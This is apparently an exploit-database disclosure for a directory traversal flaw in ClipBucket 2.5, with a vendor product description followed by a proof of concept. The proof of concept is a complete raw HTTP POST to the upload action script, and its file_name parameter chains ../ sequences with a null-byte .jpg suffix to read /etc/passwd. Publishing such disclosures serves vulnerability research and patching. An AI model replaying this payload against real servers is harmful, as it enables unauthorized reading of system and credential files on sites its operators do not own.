@@ -1,0 +1,30 @@
+# Author: loneferret of Offensive Security
+# Product: ClipBucket 
+# Version: 2.5 (and maybe older versions)
+# Vendor Site: http://clip-bucket.com/
+# Software Download: http://sourceforge.net/projects/clipbucket/
+
+# Software description:
+# ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.This script comes with all
+# the bells & whistles required to start your own Video Sharing website like Youtube, Metacafe, Veoh, Hulu or any 
+# other top video distribution application in matter of minutes. ClipBucket is fastest growing script which was
+# first started as Youtube Clone but now its advance features & enhancements makes it the most versatile, reliable & 
+# scalable media distribution platform with latest social networking features, while staying light on your pockets. 
+# Whether you are a small fan club or a big Multi Tier Network operator, Clipbucket will fulfill your video 
+# management needs. 
+
+# Vulnerability:
+# Directory Traversal.
+
+# PoC:
+POST /upload/actions/file_results.php HTTP/1.1
+Content-Length: 57
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=14f5142809e19acf92ebe405a907371e; pageredir=http%3A%2F%2F172.16.194.148%2Fupload%2F; user_1=watched; user_2=watched; quick_list_box=show; CBadminBar=hidden; current_style=list_view
+Host: 172.16.194.148
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Accept: */*
+
+file_name=../../../../../../../../../../etc/passwd%00.jpg
